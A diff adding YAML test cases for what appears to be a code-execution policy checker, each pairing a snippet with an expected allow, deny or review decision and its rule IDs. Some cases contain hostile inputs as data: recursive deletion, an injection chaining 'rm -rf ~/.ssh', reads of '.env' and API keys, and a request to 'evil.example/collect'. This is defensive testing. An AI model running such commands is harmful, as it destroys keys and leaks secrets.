@@ -1,0 +1,118 @@
+- id: safe_python
+  description: Safe Python computation with local output only.
+  language: python
+  content: |
+    values = [1, 2, 3]
+    print(sum(values))
+  expected_decision: allow
+  expected_rules: []
+
+- id: dangerous_delete
+  description: Recursive deletion of a local directory.
+  language: shell
+  command: rm -rf ./build-cache
+  expected_decision: deny
+  expected_rules:
+    - FILE_RECURSIVE_DELETE
+
+- id: read_secret_file
+  description: Python reads a dotenv file.
+  language: python
+  content: |
+    with open(".env", "r", encoding="utf-8") as secret_file:
+        print(secret_file.read())
+  expected_decision: deny
+  expected_rules:
+    - FILE_SENSITIVE_READ
+    - FILE_FORBIDDEN_PATH_ACCESS
+
+- id: network_non_whitelist
+  description: Python sends a request to a non-allowlisted domain.
+  language: python
+  content: |
+    import requests
+
+    response = requests.get("https://evil.example/collect")
+    print(response.status_code)
+  expected_decision: deny
+  expected_rules:
+    - NET_NON_WHITELIST_EGRESS
+
+- id: network_whitelist
+  description: Python sends a request to an allowlisted domain.
+  language: python
+  content: |
+    import requests
+
+    response = requests.get("https://api.github.com/repos")
+    print(response.status_code)
+  expected_decision: allow
+  expected_rules: []
+
+- id: subprocess_call
+  description: Python invokes a subprocess and requires review.
+  language: python
+  content: |
+    import subprocess
+
+    subprocess.run(["ls", "-la"], check=False)
+  expected_decision: needs_human_review
+  expected_rules:
+    - PROC_OS_SYSTEM
+
+- id: shell_injection
+  description: Shell injection payload chains a harmless echo with dangerous deletion.
+  language: shell
+  command: echo "hello"; rm -rf ~/.ssh
+  expected_decision: deny
+  expected_rules:
+    - PROC_SHELL_PIPE_OR_CHAIN
+    - FILE_RECURSIVE_DELETE
+    - FILE_SENSITIVE_READ
+
+- id: dependency_install
+  description: Python package installation requires review.
+  language: shell
+  command: python -m pip install suspicious-package
+  expected_decision: needs_human_review
+  expected_rules:
+    - DEP_PIP_INSTALL
+
+- id: infinite_loop
+  description: Python script contains an unbounded loop.
+  language: python
+  content: |
+    while True:
+        pass
+  expected_decision: needs_human_review
+  expected_rules:
+    - RES_INFINITE_LOOP
+
+- id: sensitive_env_output
+  description: Python prints a sensitive environment variable.
+  language: python
+  env_keys:
+    - OPENAI_API_KEY
+  content: |
+    import os
+
+    print(os.environ["OPENAI_API_KEY"])
+  expected_decision: deny
+  expected_rules:
+    - LEAK_ENV_SECRET
+
+- id: bash_pipe
+  description: Bash pipeline requires review.
+  language: bash
+  command: cat input.log | grep ERROR
+  expected_decision: needs_human_review
+  expected_rules:
+    - PROC_SHELL_PIPE_OR_CHAIN
+
+- id: human_review_dynamic_egress
+  description: Shell command builds a dynamic network destination.
+  language: shell
+  command: curl "https://${HOST}/status"
+  expected_decision: needs_human_review
+  expected_rules:
+    - NET_DYNAMIC_EGRESS_REVIEW
